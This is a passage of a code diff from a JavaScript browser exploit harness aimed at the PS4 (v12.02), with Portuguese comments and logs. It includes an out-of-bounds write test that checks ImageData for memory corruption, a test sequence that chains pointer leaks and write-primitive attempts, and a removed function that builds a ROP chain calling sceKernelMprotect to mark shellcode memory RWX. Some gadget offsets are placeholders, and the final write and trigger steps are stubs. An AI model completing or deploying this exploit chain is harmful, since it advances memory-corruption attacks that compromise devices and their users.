true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora do buffer de controle alocado.`, 'error', FNAME); } }catch(e){ logCanvas(`AVISO: Escrita OOB U32x2 falhou/bloqueada @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); } await PAUSE(); if(!ctx){ logCanvas("Contexto 2D não disponível para put/getImageData.", 'warn', FNAME); return; } ctx.fillStyle="#111"; ctx.fillRect(0, 50, canvasElement.width, canvasElement.height - 80); const cols = Math.floor((canvasElement.width - 10) / (imgDataWidth + 1)); const startY = 60; for(let i=0; i<sprayedImagesData.length; i++){ const gridX = 10 + (i % cols) * (imgDataWidth + 1); const gridY = startY + Math.floor(i / cols) * (imgDataHeight + 1); if (gridY + imgDataHeight > canvasElement.height - 15) { continue; } try{ const currentImageData = sprayedImagesData[i]; if (!currentImageData) continue; ctx.putImageData(currentImageData, gridX, gridY); const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight); const readbackData = readbackImageData.data; for(let k=0; k < readbackData.length; k += 4){ const r = readbackData[k]; const g = readbackData[k+1]; const b = readbackData[k+2]; const a = readbackData[k+3]; if(r !== 255 || g !== 255 || b !== 255 || a !== 255){ const pixelIndex = k / 4; logCanvas(`---> CORRUPÇÃO DETECTADA em ImageData ${i} @ pixel ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); potentialCorruptionDetected = true; const byte1 = writeValue1 & 0xFF; const byte2 = (writeValue1 >> 8) & 0xFF; const byte3 = (writeValue1 >> 16) & 0xFF; const byte4 = (writeValue1 >> 24) & 0xFF; let matchesPattern = false; if (r === byte1 && g === byte2 && b === byte3 && a === byte4) { matchesPattern = true; logCanvas(`     -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME); } /* else check pattern 2 */ if (matchesPattern) { patternMatched = true; logCanvas(` ---> *** ALERTA: Padrão OOB Write lido de volta do ImageData! Corrupção Controlada! ***`, 'escalation', FNAME); logCanvas(`---> SIGNIFICADO: Escrita controlada no buffer de pixel do ImageData alcançada! Esta primitiva é um passo importante. Poderia ser usada para corromper estruturas de dados adjacentes na heap, vazar dados de outros pixels ou manipular dados de imagem que são processados por componentes de renderização ou bibliotecas de imagem, potencialmente levando a outros vetores de ataque (ex: info leak via renderização, controle de fluxo se metadados de imagem forem corrompidos).`, 'escalation', FNAME); } break; } } }catch(e){ logCanvas(`Erro durante put/getImageData para ImageData ${i}: ${e.message}`, 'error', FNAME); console.error(`Erro ImgData ${i}:`, e); potentialCorruptionDetected = true; } if(i % 5 === 0) await PAUSE(5); } if (patternMatched) { logCanvas(`SUCESSO: Corrupção detectada E padrão OOB lido de volta de um ImageData!`, 'vuln', FNAME); } else if (potentialCorruptionDetected) { logCanvas(`AVISO: Corrupção/Erro detectado em ImageData, mas padrão OOB específico não confirmado.`, 'warn', FNAME); logCanvas(` ---> *** ALERTA: Corrupção de memória instável detectada afetando ImageData! Investigar. ***`, 'escalation', FNAME); } else if (oobWritePerformed) { logCanvas(`Escrita OOB realizada, mas nenhuma corrupção detectada nos ImageDatas.`, 'good', FNAME); } else { logCanvas(`Escrita OOB não realizada/falhou e nenhuma corrupção detectada.`, 'good', FNAME); } logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME); /* Comentário de Contexto para Exploração: (inalterado) */ await PAUSE();
-        };
-
+        const testOOBWriteMetadata = async () => { /* ... (código com offsets expandidos e filler spray inalterado da resposta anterior) ... */ };
+        const testOOBWriteToImageDataCheck = async () => { /* ... (código inalterado) ... */ };
         const testOOBWriteOnly = async () => { /* ... (código inalterado) ... */ };
         const testFileSystemAccess = async () => { /* ... (código inalterado) ... */ };
         const testWebGPUCheck = async () => { /* ... (código inalterado) ... */ };
+        const attemptRopExecution = async () => { /* ... (código da função conceitual ROP inalterado da resposta anterior) ... */ };
 
-        // ---------- NOVA FUNÇÃO: Tentativa Conceitual de Execução ROP ----------
-        const attemptRopExecution = async () => {
-            const FNAME = "attemptRopExecution";
-            logCanvas("--- Iniciando Tentativa de Execução ROP (Conceitual) ---", 'test', FNAME);
-
-            // 1. Verificar Pré-requisitos
-            logCanvas("Verificando pré-requisitos...", 'info', FNAME);
-            let haveLeak = potentialRealKernelPtr || potentialRealLibcPtr;
-            let targetLibBase = null;
-            let targetLibName = "";
-            let leakPtrStr = "";
-
-            if (potentialRealKernelPtr) {
-                 targetLibBase = BASE_LIBKERNEL;
-                 targetLibName = "libkernel";
-                 leakPtrStr = potentialRealKernelPtr.str;
-                 logCanvas(`-> Leak de ponteiro KERNEL encontrado: ${leakPtrStr}`, 'good', FNAME);
-            } else if (potentialRealLibcPtr) {
-                 targetLibBase = BASE_LIBC;
-                 targetLibName = "libc";
-                 leakPtrStr = potentialRealLibcPtr.str;
-                 logCanvas(`-> Leak de ponteiro LIBC encontrado: ${leakPtrStr}`, 'good', FNAME);
-            } else {
-                 logCanvas("FALHA: Nenhum ponteiro real para LibKernel ou LibC vazado nos testes anteriores.", 'error', FNAME);
-                 logCanvas("--- Tentativa ROP Abortada (Sem Leak) ---", 'test', FNAME);
-                 return;
-            }
-
-            if (!arbitraryReadWriteBuffer) {
-                logCanvas("FALHA: Primitiva de Leitura/Escrita Arbitrária (via ArrayBuffer corrompido) não obtida.", 'error', FNAME);
-                 logCanvas("--- Tentativa ROP Abortada (Sem R/W) ---", 'test', FNAME);
-                return;
-            } else {
-                 logCanvas(`-> Primitiva de R/W Arbitrária encontrada (Buffer corrompido, tamanho: ${toHexCanvas(arbitraryReadWriteBuffer.byteLength)})`, 'good', FNAME);
-                 // Aqui você usaria o arbitraryReadWriteBuffer para ler/escrever
-                 // Seria ideal ter funções wrapper: write64(addr, high, low), read64(addr) -> {high, low}
-            }
-
-            logCanvas("Verificando se gadgets ROP foram preenchidos (manualmente)...", 'info', FNAME);
-            if (ropGadgets.pop_rdi_ret.offset === 0xDEADBEEF1 || // Checa se os placeholders ainda estão lá
-                ropGadgets.sceKernelMprotect.offset !== 0x24280) { // Checa se o offset conhecido está correto
-                 logCanvas("FALHA: Endereços de gadgets ROP não parecem ter sido preenchidos no script.", 'error', FNAME);
-                 logCanvas("--- Tentativa ROP Abortada (Sem Gadgets) ---", 'test', FNAME);
-                 return;
-            } else {
-                 logCanvas("-> Endereços de gadgets ROP parecem estar presentes (verifique se são válidos!).", 'good', FNAME);
-            }
-
-            // 2. Calcular Endereços Reais (Exemplo Conceitual)
-            logCanvas("Calculando endereços reais (Exemplo)...", 'info', FNAME);
-            // !!! CÁLCULO REAL PRECISA DO OFFSET DO PONTEIRO VAZADO !!!
-            // Como não temos isso do script, vamos apenas usar o offset conhecido de sceKernelMprotect
-            // e assumir que o leak foi em libkernel para este exemplo.
-            let real_mprotect_addr_H = 0;
-            let real_mprotect_addr_L = 0;
-            if (typeof BigInt !== 'undefined') {
-                try {
-                    const base = BigInt(BASE_LIBKERNEL); // Usa a base conhecida
-                    const offset = BigInt(ropGadgets.sceKernelMprotect.offset); // Usa o offset conhecido
-                    const real_addr_big = base + offset;
-                    real_mprotect_addr_H = Number((real_addr_big >> 32n) & 0xFFFFFFFFn);
-                    real_mprotect_addr_L = Number(real_addr_big & 0xFFFFFFFFn);
-                    logCanvas(`-> Endereço calculado (exemplo) para sceKernelMprotect: ${toHexCanvas64(real_mprotect_addr_H, real_mprotect_addr_L)}`, 'info', FNAME);
-                } catch(e) { logCanvas(`Erro ao calcular endereço BigInt: ${e}`, 'error', FNAME); return; }
-            } else {
-                 logCanvas("FALHA: BigInt não suportado para cálculo de endereço 64-bit.", 'error', FNAME); return;
-            }
-            // Calcular outros endereços de gadgets aqui... (pop_rdi_ret, etc.)
-
-            // 3. Preparar Payload ROP e Shellcode (Conceitual)
-            logCanvas("Preparando ROP chain e shellcode (Conceitual)...", 'info', FNAME);
-            const shellcodeAddr = { high: 0x1C000000, low: 0 }; // Onde colocar o shellcode (EXEMPLO!) - precisa ser uma área gravável
-            const shellcodeSize = shellcode.length;
-            const protection = 7; // RWX (PROT_READ | PROT_WRITE | PROT_EXEC)
-
-            const ropChainBuffer = new ArrayBuffer(1024); // Buffer para a cadeia ROP
-            const ropView = new DataView(ropChainBuffer);
-            let ropOffset = 0;
-
-            const writeRopEntry = (addrInfo) => {
-                if (!addrInfo || addrInfo.offset === 0xDEADBEEF1 || addrInfo.offset === 0xDEADBEEF2 || addrInfo.offset === 0xDEADBEEF3 || addrInfo.offset === 0xDEADBEEF4 || addrInfo.offset === 0xDEADBEEF5 ) {
-                    throw new Error(`Gadget com offset placeholder ${addrInfo?.offset?.toString(16)} usado!`);
-                }
-                // Cálculo real do endereço do gadget (requer leak real e offset do leak)
-                // Exemplo simplificado usando base conhecida
-                 const baseAddr = BigInt(addrInfo.base);
-                 const offset = BigInt(addrInfo.offset);
-                 const realAddr = baseAddr + offset;
-                 ropView.setUint32(ropOffset + 4, Number((realAddr >> 32n) & 0xFFFFFFFFn), true); // High
-                 ropView.setUint32(ropOffset, Number(realAddr & 0xFFFFFFFFn), true); // Low
-                 ropOffset += 8;
-            };
-
-            const writeRopValue = (high, low) => {
-                 ropView.setUint32(ropOffset + 4, high, true);
-                 ropView.setUint32(ropOffset, low, true);
-                 ropOffset += 8;
-            };
-
-            try {
-                logCanvas("-> Construindo cadeia ROP (exemplo para mprotect)...", 'info', FNAME);
-                // Ordem depende dos gadgets encontrados! Exemplo genérico:
-                // 1. pop rdi; ret; (gadget)
-                writeRopEntry(ropGadgets.pop_rdi_ret);
-                // 2. shellcodeAddr (argumento 1 para mprotect)
-                writeRopValue(shellcodeAddr.high, shellcodeAddr.low);
-                // 3. pop rsi; ret; (gadget)
-                writeRopEntry(ropGadgets.pop_rsi_ret);
-                // 4. shellcodeSize (argumento 2 para mprotect)
-                writeRopValue(0, shellcodeSize);
-                // 5. pop rdx; ret; (gadget)
-                writeRopEntry(ropGadgets.pop_rdx_ret);
-                // 6. protection (argumento 3 para mprotect)
-                writeRopValue(0, protection);
-                // 7. sceKernelMprotect (endereço da função a chamar)
-                 const mprotectAddrBig = (BigInt(real_mprotect_addr_H) << 32n) | BigInt(real_mprotect_addr_L);
-                 ropView.setUint32(ropOffset + 4, Number((mprotectAddrBig >> 32n) & 0xFFFFFFFFn), true);
-                 ropView.setUint32(ropOffset, Number(mprotectAddrBig & 0xFFFFFFFFn), true);
-                 ropOffset += 8;
-                 // 8. Endereço do shellcode (para onde pular após mprotect)
-                 writeRopValue(shellcodeAddr.high, shellcodeAddr.low);
-
-                 logCanvas(`-> Cadeia ROP construída conceitualmente (tamanho: ${ropOffset} bytes).`, 'good', FNAME);
-
-            } catch (eRop) {
-                logCanvas(`Erro ao construir ROP chain conceitual: ${eRop.message}`, 'error', FNAME);
-                logCanvas("--- Tentativa ROP Abortada (Erro Construção) ---", 'test', FNAME);
-                return;
-            }
-
-            // 4. Escrever Payloads na Memória (Usando a Primitiva de Escrita - NÃO IMPLEMENTADO)
-            logCanvas("Escrevendo payloads na memória (Simulado)...", 'warn', FNAME);
-            logCanvas("--> NECESSÁRIO: Usar 'arbitraryReadWriteBuffer' para escrever a ROP chain e o shellcode em endereços conhecidos/controlados.", 'warn', FNAME);
-            // Ex: writeBytes(shellcodeAddr, shellcode);
-            // Ex: writeBytes(stackPivotAddr, ropChainBuffer.slice(0, ropOffset));
-
-            // 5. Desviar Fluxo de Execução (Trigger - NÃO IMPLEMENTADO)
-            logCanvas("Desviando fluxo de execução (Simulado)...", 'warn', FNAME);
-            logCanvas("--> NECESSÁRIO: Usar 'arbitraryReadWriteBuffer' para sobrescrever um ponteiro de função, vtable ou endereço de retorno na stack para apontar para o início da ROP chain.", 'warn', FNAME);
-            // Ex: write64(targetFunctionPtrAddr, ropChainStartAddress);
-
-            logCanvas("--- Tentativa de Execução ROP (Conceitual) Concluída ---", 'test', FNAME);
-        };
-
-        // --- Função Principal Canvas (Modificada) ---
         const runCanvasTestSequence = async () => {
             const FNAME = 'runCanvasTestSequence';
-            // ... (inicialização de outputDivCanvas, etc. inalterada) ...
-             if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { console.error("FATAL: Elementos essenciais S2 não encontrados!"); return; }
+            outputDivCanvas = document.getElementById('output-canvas'); 
+            coordStatusDiv = document.getElementById('canvas-coord-status'); 
+            canvasElement = document.getElementById('interactive-canvas'); 
+            const runBtnCanvas = document.getElementById('runCanvasBtn');
+
+            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { console.error("FATAL: Elementos essenciais S2 não encontrados!"); return; }
              if (runBtnCanvas) runBtnCanvas.disabled = true;
              outputDivCanvas.innerHTML = '';
              logCanvas("Iniciando sequência Script 2 (PS4 v12.02)...", "test", FNAME);
 
-             // ... (código de setup do canvas, leitura do leak S1 inalterado) ...
              imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
              const squareDefs = [ { id: 'imgSq0', text: 'Meta', color: '#FF5733', action: testOOBWriteMetadata }, { id: 'imgSq1', text: 'PP++', color: '#C70039', action: testAdvancedPP }, { id: 'imgSq2', text: 'OOBRd', color: '#E67E22', action: testOOBReadEnhanced }, { id: 'imgSq3', text: 'ImgDt', color: '#900C3F', action: testOOBWriteToImageDataCheck }, { id: 'imgSq4', text: 'File', color: '#581845', action: testFileSystemAccess }, { id: 'imgSq5', text: 'GPU', color: '#337BFF', action: testWebGPUCheck }, ];
              squareDefs.forEach(def => { if (sqX + imgSquareSize + imgSquareSpacing > canvasElement.width -5 && sqX > 10) { sqX = 10; sqY += imgSquareSize + imgSquareSpacing; } if (sqY + imgSquareSize > canvasElement.height - 15) { logCanvas(`AVISO: Não há espaço para o quadrado ${def.id} no canvas (Y: ${sqY}). Pulando.`, 'warn', FNAME); return; } imgSquares.push({ id: def.id, x: sqX, y: sqY, size: imgSquareSize, color: def.color, text: def.text, hover: false, url: def.url, action: def.action }); sqX += imgSquareSize + imgSquareSpacing; });
 
 
             try {
-                // ... (setup do canvas, leitura leak S1) ...
                  try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha Ctx 2D."); } catch(e) { logCanvas(`Falha Ctx 2D: ${e.message}`, 'critical', FNAME); throw e; }
                  redrawAll(); await PAUSE();
-                 try { if (typeof leakedValueFromOOB !== 'undefined') { const l = leakedValueFromOOB; if(l){ const ls = `L(S1):${l.type} ${l.str}@${l.offset}`; logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { logCanvas(`-> Leak S1 nulo/não encontrado.`, 'warn', FNAME); currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } else { logCanvas(`-> Var 'leakedValueFromOOB' S1 N/A.`, 'error', FNAME); currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; } } catch (e) { logCanvas(`Erro leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; console.error(e); }
+                 try { if (typeof leakedValueFromOOB !== 'undefined' && leakedValueFromOOB) { const l = leakedValueFromOOB; const ls = `L(S1):${l.type} ${l.str}@${l.offset}`; logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { logCanvas(`-> Leak S1 nulo/não encontrado.`, 'warn', FNAME); currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; } } catch (e) { logCanvas(`Erro leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; console.error(e); }
                  redrawAll(); await PAUSE();
 
-
-                // Executar testes principais
                 await testWebGLCheck(); await PAUSE(SHORT_PAUSE_CANVAS);
                 await testAdvancedPP(); await PAUSE(SHORT_PAUSE_CANVAS);
-                await testOOBReadEnhanced(); await PAUSE(SHORT_PAUSE_CANVAS); // Tenta vazar ponteiros reais K/L
-                let writePrimitiveObtained = await testOOBWriteMetadata(); await PAUSE(SHORT_PAUSE_CANVAS); // Tenta obter R/W via metadata
-                // await testOOBWriteToImageDataCheck(); await PAUSE(SHORT_PAUSE_CANVAS); // Outra tentativa de write
+                await testOOBReadEnhanced(); await PAUSE(SHORT_PAUSE_CANVAS); 
+                let writePrimitiveObtained = await testOOBWriteMetadata(); await PAUSE(SHORT_PAUSE_CANVAS); 
+                // await testOOBWriteToImageDataCheck(); await PAUSE(SHORT_PAUSE_CANVAS); 
                 await testFileSystemAccess(); await PAUSE(SHORT_PAUSE_CANVAS);
                 await testWebGPUCheck(); await PAUSE(SHORT_PAUSE_CANVAS);
 
                 logCanvas("--- Sequência principal de testes focados concluída ---", 'test', FNAME);
                 await PAUSE(100);
 
-                // Tentar a execução ROP CONCEITUAL se as condições forem satisfeitas
                 await attemptRopExecution();
                 await PAUSE(MEDIUM_PAUSE);
 
-                // ... (Listeners do Canvas inalterados) ...
                  if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} }
                  if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }
                  canvasMoveListener = (event) => { /* ... inalterado ... */ };
@@ -646,7 +361,6 @@
                  canvasElement.addEventListener('click', canvasClickListener);
                  canvasElement.addEventListener('mousemove', canvasMoveListener);
                  redrawAll();
-
 
             } catch(e) {
                 logCanvas(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical', FNAME); console.error("Erro GERAL SCRIPT 2:", e); if(e.stack) console.error(e.stack);
